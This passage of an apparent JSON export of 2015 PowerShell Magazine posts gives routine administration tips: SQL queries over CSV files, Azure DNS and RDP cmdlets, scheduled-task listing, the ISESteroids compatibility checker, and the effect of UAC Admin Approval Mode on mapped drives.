$row[\u0026#34;artist\u0026#34;] = \u0026#34;House of Cards Soundtrack\u0026#34; } $dt | Export-CSV \u0026#34;$env:TEMP\\updated-top-tracks.csv\u0026#34; -NoTypeInformation \u0026amp;\u0026#34;$env:TEMP\\updated-top-tracks.csv\u0026#34; Other Use Cases This approach is especially useful when working with larger CSV files that would potentially exhaust a machine’s memory if Import-Csv were used. I have employed a similar technique to quickly find duplicates in large CSV files, and once identified over 9,000 duplicates within a million row CSV in only 6.4 seconds.\nIf your resulting datatable is a reasonable size, you can also use it in conjunction with SqlBulkCopy to efficiently populate SQL Server tables with subsets of CSV data. When uploading larger datasets, I recommend using a paged approach instead, in order to avoid memory exhaustion.\nInvoke-CsvSqlcmd.ps1 You can find a formalized version of this technique within a script called Invoke-CsvSqlcmd.ps1, which is available on Microsoft Script Center. Invoke-CSVSQLcmd.ps1 features a seamless shell switch and straightforward delimiter support. The syntax has been simplified, making querying a CSV file as simple as:\n.\\Invoke-CsvSqlcmd.ps1 –csv file.csv –sql \u0026#34;select * from table\u0026#34; Check out Invoke-CsvSqlcmd.ps1 on Script Center for more information.\nConclusion PowerShell can natively query CSV files using SQL syntax, which drastically increases performance when working with large files and complex queries.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/05/12/natively-query-csv-files-using-sql-syntax-in-powershell/","tags":["How To","SQL"],"title":"Natively Query CSV Files using SQL Syntax in PowerShell"},{"categories":["Azure","Azure DNS"],"contents":"On May 4 2015, Microsoft has released a public preview of a new Microsoft Azure feature – Azure DNS.\nAzure DNS is a hosting service for DNS domains, providing name resolution using Microsoft Azure infrastructure. By hosting your domains in Azure, you can manage your DNS records using the same credentials, APIs, tools and billing as your other Azure services.\nYou can find more information in the Azure DNS documentation.\nThe service is based on Azure Resource Manager (ARM), and can be managed using the Azure PowerShell module. The DNS cmdlets available in the module are added in the 0.9.1 release, which you can download from the Azure PowerShell repository on GitHub.\nYou can verify what version you have installed by using Get-Module –ListAvailable –Name Azure:\nThe mode for the module must be switched to AzureResourceManager, and you must add your account and select your subscription as you normally do when working with the Azure PowerShell module:\nSwitch-AzureMode -Name AzureResourceManager Add-AzureAccount Get-AzureSubscription Select-AzureSubscription -SubscriptionName \u0026#34;your subscription name\u0026#34; It’s not currently possible to sign up for the DNS Service preview from the Azure portals, but this can be accomplished by using cmdlets in the Azure PowerShell module.\nRegister-AzureProvider -ProviderNamespace Microsoft.Network -Force Register-AzureProviderFeature -ProviderNamespace Microsoft.Network -FeatureName azurednspreview -Force Get-AzureProviderFeature -ProviderNamespace Microsoft.Network -FeatureName azurednspreview It may take up to 24 hours for the registration state to change to Registered:\nBefore creating a new DNS zone, you must decide what resource group to place the zone into. You may use an existing resource group, or you can create a new one:\nNew-AzureResourceGroup -Name Networking -Location \u0026#39;West Europe\u0026#39; For testing purposes, I’ve decided to use a subdomain of my powershell.no domain:\nNew-AzureDnsZone -Name azure.powershell.no -ResourceGroupName Networking When the zone is created, you must add the appropriate Name Server (NS) records to the DNS zone at your registrar/hoster (it`s not yet available to host your domain in Azure). To find the values for the records you need to configure, you can use the Get-AzureDnsRecordSet cmdlet:\nGet-AzureDnsRecordSet -ZoneName azure.powershell.no -ResourceGroupName Networking -RecordType NS In the DNS Control Panel at my registrar, it looks like this after I added the NS records for the Azure DNS Service:\nNow you can start creating DNS records in the new zone, and they should be resolved by the Azure DNS service.\nNew-AzureDnsRecordSet -Name www -RecordType A -ZoneName azure.powershell.no -Ttl 60 | Add-AzureDnsRecordConfig -Ipv4Address \u0026#39;1.2.3.4\u0026#39; | Set-AzureDnsRecordSet You can then verify the new record by using familiar tools such as the Resolve-DnsName cmdlet or the traditional nslookup utility:\nTo further explore the available cmdlets for managing Azure DNS, you can use Get-Command -Module AzureResourceManager -Name Dns\nYou can also find more information and examples on the Azure DNS Documentation website.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/05/11/manage-your-public-dns-zones-with-azure-dns/","tags":["Azure","Azure DNS"],"title":"Manage your public DNS zones with Azure DNS"},{"categories":["Tips and Tricks"],"contents":"When working with Azure it can be useful to quickly connect to a number of Azure VMs. Unfortunately this might result in having to enter your password multiple times. To circumvent this problem I wrote the Connect-Mstsc function which accepts a user name and password as parameters. The function stores the credentials in the local credential store and because of this the credentials do not have to be separately entered when connecting via RDP to the remote system. Although the Get-AzureRemoteDesktopFile is a useful cmdlet that creates an .RDP file for Remote Desktop connection, it does prompt for the credentials.\nFor example, to connect to an Azure Virtual Machine using its hostname and port number:\n$Cred = Get-Credential Connect-Mstsc –ComputerName cloudservice.cloudapp.net:58142 –Credential $Cred This also works in combination with the Azure PowerShell, if a RDP session needs to be created with all of the systems that have RDP configured the following code can be used. It filters based on the AzureEndpoint which has port 3389 configured:\n$Cred = Get-Credential Get-AzureVM | Get-AzureEndPoint | Where-Object {$_.LocalPort -eq 3389} | ForEach-Object { Connect-Mstsc -ComputerName ($_.Vip,$_.Port -join \u0026#39;:\u0026#39;) -Credential $Cred } The Connect-Mstsc function is available for download in the TechNet Script Gallery: Connect-Mstsc\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/16/pstip-connect-to-azure-virtual-machines-without-being-prompted-for-credentials/","tags":["Tips and Tricks"],"title":"PSTip: Connect to Azure Virtual Machines without being prompted for credentials"},{"categories":["PowerShell DSC"],"contents":"The DSC resource development team at Microsoft released ten waves of DSC resource kit that has almost 180 resources. There are resources for System Center products, Azure Pack, Microsoft Exchange, and many more. At the same time, the PowerShell community too started writing custom DSC resources for various other products or technologies. For example, at PowerShell Magazine, we published over 25 resources to manage Azure Operational Insights, Azure Backup, Hyper-V converged switches, and so on. Like us, there are many of you who developed resources and shared with the community.\nThe biggest problem with these silos is that the users of these DSC resources have to look at different sources. Also, there may be issues (there will be) and fixing these issues in silos without a way to push them upstream is a major limitation. To some extent, being in an open source repository like Github helps. This is what we believed and put all our resources on Github. Now, it’s Microsoft’s turn. For an organization as big as Microsoft and with different product teams contributing to the DSC resource repository, it is not easy to just move everything to Github overnight. They need a process to publish and sustain the resource modules. At the same time, they need to enable the community to contribute as well.\nWe are happy to share that Microsoft has finally put the DSC resource kit on Github as individual resource modules. You can now not just use the modules in the repository but contribute as well. There are, of course, a bunch of guidelines for contribution. If you really want your custom DSC resource module be hosted in this repository, you better follow the guidelines. If not for getting into the repo, these guidelines help you build a better continuous integration story and a better way to test your modules before you release them.\nWith this, I am getting back to my work of making PowerShell Magazine resources compliant so that I can push them to Microsoft repository. What are you waiting for?\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/16/fasten-your-seat-belts-and-start-contributing-to-the-dsc-powershell-resource-repository/","tags":["PowerShell DSC"],"title":"Fasten your seat belts and start contributing to the DSC PowerShell resource repository!"},{"categories":["Tips and Tricks"],"contents":"Changing a drive letter of a removable drive or DVD drive is an easy task with Windows PowerShell. Using the Win32_Volume class and the Set-CimInstance cmdlet a drive letter can be reassigned. The following code will change the drive letter for the F: drive and change the drive letter to Z:\n$DvdDrive = Get-CimInstance -Class Win32_Volume -Filter \u0026#34;driveletter=\u0026#39;F:\u0026#39;\u0026#34; Set-CimInstance -InputObject $DvdDrive -Arguments @{DriveLetter=\u0026#34;Z:\u0026#34;} Alternatively this can also be executed in a single line of code by using the pipeline:\nGet-CimInstance -Query \u0026#34;SELECT * FROM Win32_Volume WHERE driveletter=\u0026#39;F:\u0026#39;\u0026#34; | Set-CimInstance -Arguments @{DriveLetter=\u0026#34;Z:\u0026#34;} For more information about the Win32_Volume class have a look at the MSDN entry here:\nWin32_Volume Class\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/15/pstip-change-a-drive-letter-using-win32_volume-class/","tags":["Tips and Tricks"],"title":"PSTip: Change a drive letter using Win32_Volume class"},{"categories":["Tips and Tricks"],"contents":"When working with the PowerShell ISE it can occur that there are a lot of untitled scripts left at the end of a busy day of scripting. Occasionally something interesting or useful could be left in those tabs. The following function can be used to copy the content from the untitled tabs to the clipboard.\nThe function uses the $_.IsUntitled property of each open file in the ISE to detect if the tab is untitled. The contents of all tabs are piped into clip.exe:\nFunction Send-UntitledToClip { $psISE.PowerShellTabs.Files | Where-Object {$_.IsUntitled} | ForEach-Object { $_.Editor.Text } | clip.exe } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/14/pstip-save-untitled-tabs-in-powershell-ise-to-clipboard/","tags":null,"title":"PSTip: Save untitled tabs in PowerShell ISE to clipboard"},{"categories":["Tips and Tricks"],"contents":"In Windows files can have a lot of additional file attributes that are not shown when using the Get-ChildItem cmdlet. To reveal these the Shell.Application can be used as it allows to retrieve these extending attributes by using the GetDetailsOf method. The following example will retrieve the first three attributes from all the files and folders in the root folder of the C:\\ drive.\n$com = (New-Object -ComObject Shell.Application).NameSpace(\u0026#39;C:\\\u0026#39;) $com.Items() | ForEach-Object { New-Object -TypeName PSCustomObject -Property @{ Name = $com.GetDetailsOf($_,0) Size = $com.GetDetailsOf($_,1) ItemType = $com.GetDetailsOf($_,2) } } The challenging aspect of using the Shell.Application object is that the GetDetailsOf method relies on integers as input to retrieve the additional attributes. These attributes vary by version of Windows and the localization options. For example, a Russian version of Windows not only has different names for the attributes when compared the American-English localization, but also the index numbers are not identical. To list the available attributes and their index numbers for the current localization the Get-DetailsOf method can be called against the namespace in order to retrieve the both the name and index number for all extension attributes. The following command will list all index numbers:\n$com = (New-Object -ComObject Shell.Application).NameSpace(\u0026#39;C:\\\u0026#39;) for ($index = 1; $index -ne 400; $index++) { New-Object -TypeName PSCustomObject -Property @{ IndexNumber = $Index Attribute = $com.GetDetailsOf($com,$index) } | Where-Object {$_.Attribute} } To work around this issue I have written a function that uses dynamic parameters to retrieve the attribute names and their corresponding index numbers to simplify the retrieval of these attributes. The full function is available in the TechNet Script Library: Get-ExtensionAttribute.\nfunction Get-ExtensionAttribute { [CmdletBinding()] Param ( [Parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, Position=0)] [string[]] $FullName ) DynamicParam { $Attributes = New-Object System.Management.Automation.ParameterAttribute $Attributes.ParameterSetName = \u0026#34;__AllParameterSets\u0026#34; $Attributes.Mandatory = $false $AttributeCollection = New-Object -Type System.Collections.ObjectModel.Collection[System.Attribute] $AttributeCollection.Add($Attributes) $Values = @($Com=(New-Object -ComObject Shell.Application).NameSpace(\u0026#39;C:\\\u0026#39;);1..400 | ForEach-Object {$com.GetDetailsOf($com.Items,$_)} | Where-Object {$_} | ForEach-Object {$_ -replace \u0026#39;\\s\u0026#39;}) $AttributeValues = New-Object System.Management.Automation.ValidateSetAttribute($Values) $AttributeCollection.Add($AttributeValues) $DynParam1 = New-Object -Type System.Management.Automation.RuntimeDefinedParameter(\u0026#34;ExtensionAttribute\u0026#34;, [string[]], $AttributeCollection) $ParamDictionary = New-Object -Type System.Management.Automation.RuntimeDefinedParameterDictionary $ParamDictionary.Add(\u0026#34;ExtensionAttribute\u0026#34;, $DynParam1) $ParamDictionary } begin { $ShellObject = New-Object -ComObject Shell.Application $DefaultName = $ShellObject.NameSpace(\u0026#39;C:\\\u0026#39;) $ExtList = 0..400 | ForEach-Object { ($DefaultName.GetDetailsOf($DefaultName.Items,$_)).ToUpper().Replace(\u0026#39; \u0026#39;,\u0026#39;\u0026#39;) } } process { foreach ($Object in $FullName) { # Check if there is a fullname attribute, in case pipeline from Get-ChildItem is used if ($Object.FullName) { $Object = $Object.FullName } # Check if the path is a single file or a folder if (-not (Test-Path -Path $Object -PathType Container)) { $CurrentNameSpace = $ShellObject.NameSpace($(Split-Path -Path $Object)) $CurrentNameSpace.Items() | Where-Object { $_.Path -eq $Object } | ForEach-Object { $HashProperties = @{ FullName = $_.Path } foreach ($Attribute in $MyInvocation.BoundParameters.ExtensionAttribute) { $HashProperties.$($Attribute) = $CurrentNameSpace.GetDetailsOf($_,$($ExtList.IndexOf($Attribute.ToUpper()))) } New-Object -TypeName PSCustomObject -Property $HashProperties } } elseif (-not $input) { $CurrentNameSpace = $ShellObject.NameSpace($Object) $CurrentNameSpace.Items() | ForEach-Object { $HashProperties = @{ FullName = $_.Path } foreach ($Attribute in $MyInvocation.BoundParameters.ExtensionAttribute) { $HashProperties.$($Attribute) = $CurrentNameSpace.GetDetailsOf($_,$($ExtList.IndexOf($Attribute.ToUpper()))) } New-Object -TypeName PSCustomObject -Property $HashProperties } } } } end { Remove-Variable -Force -Name DefaultName Remove-Variable -Force -Name CurrentNameSpace Remove-Variable -Force -Name ShellObject } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/13/pstip-use-shell-application-to-display-extended-file-attributes/","tags":["Tips and Tricks"],"title":"PSTip: Use Shell.Application to display extended file attributes"},{"categories":["Tips and Tricks"],"contents":"In PowerShell 4.0, the Get-ScheduledTask cmdlet was introduced, but unfortunately this cmdlet is not available in older versions of PowerShell. This is where the Schedule.Service COMObject can be useful to enumerate scheduled tasks on a local or remote system. Unfortunately, unlike the Get-ScheduledTask cmdlet using this COMObject requires an elevated PowerShell console with administrative credentials. The following example will list the all tasks in the \\ folder of the Task Scheduler and display the Name, Path and State of the tasks:\n$Schedule = New-Object -ComObject \u0026#34;Schedule.Service\u0026#34; $Schedule.Connect(\u0026#39;localhost\u0026#39;) $Folder = $Schedule.GetFolder(\u0026#39;\\\u0026#39;) $Folder.GetTasks(1) | Select Name,Path,State Unfortunately this outputs the state as an integer instead of a string. To resolve this calculated properties in combination with the switch operator will display the user-friendly names:\n$Schedule = New-Object -ComObject \u0026#34;Schedule.Service\u0026#34; $Schedule.Connect(\u0026#39;localhost\u0026#39;) $Folder = $Schedule.GetFolder(\u0026#39;\\\u0026#39;) $Folder.GetTasks(1) | Select Name,Path,@{ Name = \u0026#39;State\u0026#39; Expression = {switch ($_.State) { 0 {\u0026#39;Unknown\u0026#39;} 1 {\u0026#39;Disabled\u0026#39;} 2 {\u0026#39;Queued\u0026#39;} 3 {\u0026#39;Ready\u0026#39;} 4 {\u0026#39;Running\u0026#39;} } } } This still provides only the scheduled tasks that are listed in the root folder. In order to recursively search through all folders additional code will be required. A script that iterates through all folders in the scheduler and displays all tasks is available in the TechNet Script Gallery: Get-ScheduledTask\nparam( $computername = \u0026#34;localhost\u0026#34;, [switch]$RootFolder ) #region Functions function Get-AllTaskSubFolders { [cmdletbinding()] param ( # Set to use $Schedule as default parameter so it automatically list all files # For current schedule object if it exists. ​ $FolderRef = $Schedule.getfolder(\u0026#34;\\\u0026#34;) ​ ) ​ if ($FolderRef.Path -eq \u0026#39;\\\u0026#39;) { ​ $FolderRef ​ } ​ if (-not $RootFolder) { ​ $ArrFolders = @() ​ if(($folders = $folderRef.getfolders(1))) { ​ $folders | ForEach-Object { ​ $ArrFolders += $_ ​ if($_.getfolders(1)) { ​ Get-AllTaskSubFolders -FolderRef $_ ​ } ​ } ​ } ​ $ArrFolders ​ } } #endregion Functions try { $schedule = New-Object –ComObject (\u0026#34;Schedule.Service\u0026#34;) } catch { Write-Warning \u0026#34;Schedule.Service COM Object not found, this script requires this object\u0026#34; return } $Schedule.connect($ComputerName) $AllFolders = Get-AllTaskSubFolders foreach ($Folder in $AllFolders) { if (($Tasks = $Folder.GetTasks(1))) { $Tasks | Foreach-Object { New-Object -TypeName PSCustomObject -Property @{ \u0026#39;Name\u0026#39; = $_.name \u0026#39;Path\u0026#39; = $_.path \u0026#39;State\u0026#39; = switch ($_.State) { 0 {\u0026#39;Unknown\u0026#39;} 1 {\u0026#39;Disabled\u0026#39;} 2 {\u0026#39;Queued\u0026#39;} 3 {\u0026#39;Ready\u0026#39;} 4 {\u0026#39;Running\u0026#39;} Default {\u0026#39;Unknown\u0026#39;} } \u0026#39;Enabled\u0026#39; = $_.enabled \u0026#39;LastRunTime\u0026#39; = $_.lastruntime \u0026#39;LastTaskResult\u0026#39; = $_.lasttaskresult \u0026#39;NumberOfMissedRuns\u0026#39; = $_.numberofmissedruns \u0026#39;NextRunTime\u0026#39; = $_.nextruntime \u0026#39;Author\u0026#39; = ($_.xml).Task.RegistrationInfo.Author \u0026#39;UserId\u0026#39; = ($_.xml).Task.Principals.Principal.UserID \u0026#39;Description\u0026#39; = ($_.xml).Task.RegistrationInfo.Description } } } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/10/pstip-retrieve-scheduled-tasks-using-schedule-service-comobject/","tags":["Tips and Tricks"],"title":"PSTip: Retrieve scheduled tasks using Schedule.Service COMObject"},{"categories":["Tips and Tricks"],"contents":"While it is great that PowerShell can do so many things in the background without having to interact with it, occasionally it might be useful to have a graphical notification. For example, when a job finishes or when input is required in order for the script to be able to continue. For this purpose a popup window can be displayed; this is possible using the Windows.Forms namespace and in particular the MessageBox class.\nThe following example will display a MessageBox form with an OK button and the ‘Hello World’ text:\nAdd-Type -AssemblyName System.Windows.Forms | Out-Null [System.Windows.Forms.MessageBox]::Show(\u0026#34;Hello World\u0026#34;) The MessageBox class can accept more arguments than just a single string. To explore the possible constructors the Show method can be called without any parameters displaying all OverloadDefinitions. In the following code the OverloadDefinitions and the total count of possible definitions will be displayed:\n[System.Windows.Forms.MessageBox]::Show [System.Windows.Forms.MessageBox]::Show.OverloadDefinitions.Count The output from the previous command shows that it is possible to change the MessageBoxButtons and that it is possible to add a MessageBoxIcon. The GetNames method of the Enum class can be called to enumerate the possible entries for these options:\n[Enum]::GetNames([System.Windows.Forms.MessageBoxButtons]) [Enum]::GetNames([System.Windows.Forms.MessageBoxIcon]) The parameters for Title, Caption, MessageBoxButtons and MessageBoxIcon will be specified to create a new MessageBox. The output will be stored in the $MessageBox variable and can be used for further execution in the script:\n$MessageBox = [System.Windows.Forms.MessageBox]::Show( \u0026#39;Text\u0026#39;,\u0026#39;Caption\u0026#39;,\u0026#39;YesNoCancel\u0026#39;,\u0026#39;Question\u0026#39; ) For more information about the MessageBox class and to view all the definitions have a look at its MSDN entry:\nMessageBox Class\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/09/pstip-use-windows-forms-to-generate-gui-messagebox/","tags":["Tips and Tricks"],"title":"PSTip: Use Windows Forms to generate GUI messagebox"},{"categories":["How To"],"contents":"You may remember “DLL Hell” from the old days. A very similar beast lives in our PowerShell ecosystem, too.\nTake 5 different PowerShell versions, all with different supported cmdlets, language elements, and parameters, and blend this with hundreds of available modules – out comes a truly high-proof cocktail, and it becomes evident that it’s far from trivial to safely develop code for a given platform.\nThat’s simply life and the course of technical evolution, but there are ways to make this cocktail much more tolerable. ISESteroids has just added some safety gear for professional PowerShellers called CompatAware.\nIt is part of a series of assistance systems design to write better code in less time, and improving your PowerShell skills and knowledge while you code. After all, cars today have airbags and navigation systems, too.\nMuch of what is going to be presented here was inspired by the overwhelmingly positive and valuable community feedback. Thank you much for your trust.\nTargeting a PowerShell Version Let’s play a bit with CompatAware and see how it can clean up the version jungle. There is really just one initial setting to care about: specify the PowerShell version you are targeting.\nSimply open the (new) menu “Level”, and choose “CompatAware”, then pick your PowerShell target version. Let’s assume I need to run a script on some older machines with only PowerShell 2.0 available.\nThe moment you set a PowerShell target version, ISESteroids starts to highlight all cmdlets, parameters, and language constructs that are not compatible with this version. A yellow squiggle line indicates incompatibilities in real-time, while you code.\nThat’s important: you don’t want to invest hours of work, just to discover at the end that your approach won’t work at the customer’s site. Real-time information is what let’s you rapidly rethink the route you are taking.\nIn the screenshot, you actually see two squiggles: the blue squiggle indicates a best practice violation (“do not use aliases in scripts”), and the yellow squiggle reveals that the command “dir” (aka Get-ChildItem) had no -Directory parameter in PowerShell 2.0. It was added only in PowerShell 3.0.\nNote that the -Path parameter is not underlined, and neither is the command itself. They both work fine with PowerShell 2.0, and CompatAware is very specific.\nBefore we dig into the actual compatibility informations delivered by CompatAware, let’s first take a quick tour of technologies that CompatAware shares with the other assistance systems in ISESteroids.\nSquiggles provide Hover Information Squiggles serve just one purpose: to catch your attention and curiosity, yet without distracting you too much. Once you’re hungry for more, simply hover over a squiggle.\nTooltips provide you with extra information, tossing in little doses of PowerShell wisdom when you are ready for it. This way you can refine your scripts and gather extra knowledge while you work.\nSquiggles are just the visible tip of an information iceberg and backed by a fully adjustable information system.\nTake the descriptive text for example that is provided by yellow squiggle tooltips. It is fully expandable. If you’d like to add your own compatibility notes, take a peek into the folder “Compatibility” inside the ISESteroids program folder. Here, you’ll find simple text files for all compatibility warnings, and you can edit and expand the descriptive text as you like.\nLikewise, when you hover over a blue or green squiggle line, you get helpful information about why your code has just violated best practices. And if ISESteroids can fix the issue for you, a “light bulb” shows in the debugger margin, inviting you to click on the bulb to auto-correct all instances of this problem – and then move on to your next task.\nIntelligent Syntax Error Analysis Admittedly, some syntax errors are rather obvious, but others can drive you nuts. So ISESteroids enhances the default tooltip messages with helpful hints, too, that help you solve the puzzle fast.\nLet’s take a look at a real-world example: some piece of PowerShell code suddenly starts to display multiple red squiggles, as if struck by measles. What’s wrong? And where to start?\nFirst of all, tooltips tell you when you are looking at the wrong spot. Some syntax errors are just artefacts of the true underlying error (and please excuse the original German error messages in the screen shots, no time for MUI fiddles right now).\nSo in the below screenshot, the tooltip indicates that this syntax error is not the root cause, and that you should instead spend your precious time looking at line 7.\nWhen you do this and look at line 7, the tooltip here reveals what needs to be done to get rid of all the red lines: simply “add a comma”! Sometimes, the remedy can be really simple once you know what’s going on. If you have the time to learn more, below this message you get short background infos.\nOnce you add a comma, all the other syntax errors vanish, and you are good to go.\nOf course, ISESteroids cannot know all recipes against all possible syntax errors. Instead, ISESteroids invites you to add your own notes and pieces of wisdom: You can add information to specific syntax errors.\nAttach Wisdom to Syntax Errors When there is no predefined wisdom attached to a syntax error, the tooltip encourages you to add your own content.\nTo do this, right-click the warning sign in the debugger margin. This opens a context menu. Simply choose “Create/Edit Annotations”. This in turn opens a dialog.\nIn this dialog, you can now add two things: in the top text box, add a short and precise description of what should be done to get rid of this error. In the text box below, feel free to add explaining descriptions.\nOnce you are done, click “Apply” to save the annotation. Then, click the link “Open annotation folder”. This opens the folder where ISESteroids saves all of your annotations – they are just plain text files. What’s more interesting is the file name.\nIn this example, the file name will be “RCurlynullWhile.txt”, and the file is stored in the folder MissingOpenParenthesisAfterKeyword. As you may have guessed, the folder specifies the kind of syntax error. The file name determines which solution should be displayed.\n“RCurlynullWhile.txt” really means: the token before the error should be a “RCurly”, the token at the error should be “null”, and the following token should be “While”. So your annotation is highly specific for a certain syntax error scenario. If you want your annotation to be less specific, simply replace each token that you do not care about with a hyphen. So when you rename the file to “–While.txt”, then your annotation will be displayed for all syntax errors of this kind that deal with the “While” keyword.\nDealing With Runtime Errors Syntax errors are grammatical errors, much like misspelled words in Word. Runtime errors, in contrast, are revealed only when a script runs. The code is fine, but your script is unable to perform what it wanted to do. Let’s say you were trying to stop a service but your script did not have appropriate privileges.\nISESteroids can detect runtime errors, and will display the same red squiggle line. It even brings runtime errors into view once a script is done, and when you hover over the squiggle, you get information about the runtime error.\nSince runtime errors typically require a bit more information, ISESteroids employs a feature called “MagneticNotes”. You can see MagneticNotes in action when you look at the screen shot: in an add-on panel, MagneticNotes explain why this runtime error occured, and what needs to be done.\nTo see MagneticNotes, open the MagneticNotes add-on. You toggle this add-on with the Add-on button displaying a lightning bolt.\nNext, click anything inside your editor: a command, a keyword, or a runtime error.\nMagneticNotes – Attach Information to Tokens and Errors MagneticNotes are a quick way of attaching arbitrary information to a specific PowerShell token or runtime error. Instead of searching for information, ISESteroids displays the information when you need it. Once you click a token or runtime error, MagneticNotes show the notes you saved earlier. If there are no notes yet attached to the clicked item, you can add notes and save them.\nLikewise, to edit existing notes, simply right-click the annotation, and choose “Edit”.\nMagneticNotes can contain plain text, and code samples. To add code samples, select some code in your editor, copy it to the clipboard, and paste it into the MagneticNotes editor.\nFinding Dependencies By now you have a solid understanding of how CompatAware is just another assistance system, sharing the same visual concept of squiggles and just-in-time tooltips and MagneticNotes.\nLet’s now return to the original CompatAware feature, and have a final look at the scope of compatibility information it can provide. CompatAware is not limited to PowerShell compatibility issues. It can also pinpoint vital code dependencies, like required external modules or commands.\nTo get dependency information, open the “Level” menu, choose “CompatAware”, then enable “Mark non-default commands”. Once you do this, ISESteroids adds a yellow squiggle to all commands that are not shipping with PowerShell. This helps you quickly identify commands that originate in optional 3rd party modules.\nAuto-Generating #requires To play safe, a script should either run successfully, or not run at all. The worst scenario always is a script that stalls in the middle of something, leaving you with a lot of cleanup work.\nPowerShell scripts can add a #requires statement, listing all the requirements your script needs to successfully run. Since CompatAware already knows what your script needs, it can derive and auto-generate the correct #requires statement for your script. Existing #requires statements are properly updated.\nSimply visit the CompatAware menu, and choose “Add/Update #requires statement”, or press CTRL+ALT+R.\nYou can also use the cmdlet Update-SteroidsRequiresStatement, or run the refactoring addon (the button shows a green checkmark). It will add or update #requires statements automatically as part of the code optimization rules tied to it.\nAuto-Generating Compatibility Reports CompatAware also shares the compatibility info with you. So you can create compatibility reports, or use the compatibility information in your own reporting tools.\nTo get a compatibility report, visit again the CompatAware menu, and choose “Compatibility Report”. The rich object data can also be directly retrieved:\nGet-SteroidsCompatibilityReport -TargetVersion 2 -IncludeDependencies\n(Replace “2” with the PowerShell version you want to check against).\nWhat’s Next? We have so many more ideas for you, and get nourished by your constant stream of feedback and ideas. One of the features you suggested was a better way to switch between multiple editor panes. Try and hold the right mouse button, then move your mouse wheel. Or hold CTRL, then press PageUp or PageDown.\nWe now focus on getting ISESteroids 2.0 Final out of the door and would like to celebrate this milestone at the 3rd German PowerShell Conference April 22 in the Philharmony in Essen.\nSpeaking of which: if you are located in Europe, have at least some basic German language skills yet some great PowerShell passion, then be there: April 22+23, Essen, Germany, 12 international speakers including Bruce Payette, Aleksandar Nikolic, Jeff Wouters, Bartek Bielawski, and so many more… a few seats are still available.\nAnd if you like ISESteroids, then supporting the ISESteroids initiative is super easy: just make sure your company orders a really huge number of licenses! Just kidding, but it is true that license revenues fund all of this.\nHopefully we get a chance to meet at the PowerShell Conference!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/09/compataware/","tags":["How To"],"title":"CompatAware: Scripting against different PowerShell versions"},{"categories":["How To"],"contents":"In modern days Windows operating systems, User Account Control (UAC) is enabled by default. There are some considerations when using PowerShell and running a script in elevated or non-elevated context. This and some of the issues that can occur because of UAC will be addressed in this article.\nUAC is configured in Admin Approval Mode by default. In this Mode, when an administrator logs on to a system, two tokens are assigned to the user — a normal full control token and a special filtered access token. This helps prevent an administrator from making an accidental change that might have system wide consequences or prevent the accidental installation of a malicious program. The filtered access token is created during the logon process and is used to start explorer.exe process. Any application that is started from this moment on will by default be launched using this filtered access token.\nThere are some slight differences to the configuration of Admin Approval Mode on client systems and server systems. The most notable one is that on Windows Server the default administrator account is enabled and is the only account for which Admin Approval Mode is disabled by default. This allows for an easy bypass on Windows Server systems. On Windows Client systems, the administrator account is disabled by default. However, once this administrator account is enabled, Admin Approval Mode is disabled by default on client systems too.\nTo show how Admin Approval Mode is relevant in PowerShell context, the next demonstration will show what happens when a drive mapping is created in both an elevated and non-elevated PowerShell console. The impact that this has for PowerShell can be demonstrated by opening two consoles, one regular console using the filtered access token and one elevated console, started using Run as Administrator. In both consoles, a drive mapping will be created by typing the following commands:\nNew-PSDrive -Name Y -PSProvider FileSystem -Root \\localhost\\c$ -Persist New-PSDrive -Name Z -PSProvider FileSystem -Root \\localhost\\c$ -Persist To verify the results of this command in each console, the Get-PSDrive cmdlet can be executed to verify which mapped drives are visible in the current context:\nGet-PSDrive –PSProvider FileSystem It is clearly visible that the mapped drives for either token are unavailable in the other sessions. This can also be seen by opening File Explorer, which is also running using the filtered access token:\nAs expected, only the mapped drive created in the non-elevated PowerShell console is visible from File Explorer. Because this is part of the UAC security infrastructure, this problem is not limited to PowerShell but can also be observed when mapping drives in command prompt. This article will limit to the implications that this security setting has on PowerShell, specifically when mapping network drives. The take away here is that when mapping network drives the correct security context should be used.\nThere are workarounds available for this issue, one method is to disable Admin Approval Mode for all administrators. Because this is a registry setting with significant impact on how User Account Control works a restart is required. Disabling Admin Approval Mode has a distinct disadvantage, it will cause Modern Apps to stop working. The following error message will be displayed:\nIf this is not a concern, the following PowerShell line can be executed to disable Admin Approval mode all together:\nNew-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name EnableLUA -Value 0 -Force To enable Admin Approval Mode, the same command can be executed, changing the value from zero to one.\nThe preferred workaround is to Enable Linked Connections registry setting. When this setting is enabled, drive mappings are mirrored between the filtered access token and full control token. Because the drive mappings are being mirrored, the drives that are mapped in a non-elevated console will be visible in an elevated console and vice-versa. A restart is usually required to make this registry setting active. This setting can be enabled by creating the following registry key using PowerShell:\nNew-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name EnableLinkedConnections -Value 1 –Force To verify the results of this registry setting, the same commands that were executed at the beginning of this article will be repeated in a non-elevated console and an elevated console.\nThe results are as follows:\nAnd when File Explorer is opened, both mapped network drives are available:\nWhen working with modern operating systems and PowerShell, it is important to keep in mind the challenges that are introduced by UAC. While UAC can be completely disabled, this can have undesirable side-effects such as Modern Apps not being functional and a less secure computing environment. If it is important to have the same mapped drives in non-elevated PowerShell consoles as well as the elevated PowerShell consoles, the EnableLinkedConnections registry can be set to facilitate this.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/08/user-account-control-and-admin-approval-mode-the-impact-on-powershell/","tags":["How 